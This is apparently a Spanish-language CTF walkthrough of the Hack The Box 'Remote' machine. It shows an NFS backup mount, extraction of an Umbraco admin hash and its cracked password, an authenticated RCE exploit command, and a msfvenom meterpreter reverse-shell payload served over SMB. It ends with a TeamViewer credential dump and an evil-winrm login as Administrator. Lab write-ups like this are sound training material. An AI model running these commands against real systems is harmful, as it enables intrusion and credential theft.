---
title: Maquina Remote
description: Prueva de Penetracion tipo Test Web
author: kytty
date: 2024-04-12 12:00:00 +0800
categories: [Hacking, CTF]
tags: [WEB]
---
Hacemos el reconocimiento de nmap:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125451.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125716.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125736.png)
Identificamos un ftp como anonymous habilitado, pero no encontramos nada:

Y si accedemos al contenido del puerto 80, vemos lo siguiente:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125554.png)
Realizamos fuzzing web y encontramos los siguientes directorios; y encontramos algo que dice umbraco:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125850.png)
Donde tenemos el siguiente panel de login:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125910.png)
Probamos con el usuario admin y nos confirman que existe dicho usuario:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202125934.png)
Por aquí no encontramos nada, por lo que continuamos enumerando el puerto 111 donde corre el protocolo de NFS, por lo que tenemos tanto las herramientas de nmap como showmount, donde nos encontramos con la montura de /site-backups
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202130439.png)
En este punto, podemos montar una carpeta en el directorio /mnt y así accedemos al directorio /site-backups:
```python
mount -t nfs 10.10.10.180:/site_backups /mnt/
```
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131013.png)
E identificamos el directorio /umbraco, donde posiblemente podamos encontrar algunas credenciales, pero ello estará dentro del directorio /App_Data y analizando el fichero Umbraco.sdf:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131317.png)
Lo abrimos con el comando strings y vemos información de un usuario administrador:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131336.png)
Y nos fijamos en su hash:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131408.png)
Lo intentamos crackear en crackstation, donde vemos que la contraseña es baconandcheese:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131455.png)
```bash
Admin@htb.local:baconandcheese
```
Y ahora accedemos dentro del panel de login:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131605.png)
Si miramos en el panel de ayuda, vemos la versión:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202131945.png)
Si buscamos por internet, vemos que podemos explotar una vulnerabilidad:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202132017.png)
Y ahora vamos a clonar el repositorio, instalamos las dependencias y lo ejecutamos:
```python
pip install -r requirements.txt
```
Lo ejecutamos y vemos las instrucciones del exploit:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202132348.png)
Lo ejecutamos proporcionando la información correcta:
```python
python3 exploit.py -u Admin@htb.local -p baconandcheese -w 'http://10.10.10.180' -i 10.10.16.24
```
Y obtenemos la conexión:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202132740.png)
Pero esta conexión es muy inestable, por lo que nos mandamos otra reverse shell utilizando revshells:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133021.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133028.png)
Y recibimos la nueva conexión:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133043.png)
Nos ubicamos en \temp:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133131.png)
Lo siguiente será upgradear a una sesión de meterpreter para tener más poder sobre la máquina, por lo que creamos un payload con msfvenom:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.24 LPORT=4444 -f exe -o virus.exe
```
Lo compartimos:
```bash
impacket-smbserver recurso $(pwd) -smb2support
```
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133605.png)
Lo recibimos en la máquina víctima:
```bash
copy \\10.10.16.24\recurso\virus.exe virus.exe
```
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133640.png)
Nos ponemos en escucha con el multi/handler, estableciendo el payload de un meterpreter, y ya estamos dentro:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133716.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202133704.png)
Si nos ubicamos en el directorio de archivos de programa, vemos un directorio llamado TeamViewer, que posiblemente dentro de aquí podamos encontrar credenciales:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202134647.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202134713.png)
Con metasploit tenemos un módulo de post explotación que nos permite analizar TeamViewer en busca de credenciales, por lo que vamos a utilizarlo:
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202134813.png)
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202134837.png)
Tenemos las siguientes credenciales:
```bash
Administrator:!R3m0te!
```
Probamos en acceder con evil-winrm y ya estamos dentro como el usuario Administrador:
```bash
evil-winrm -i 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
```
![](/assets/img/2024-04-13-MAQUINA-REMOTE/Pasted image 20231202135011.png)
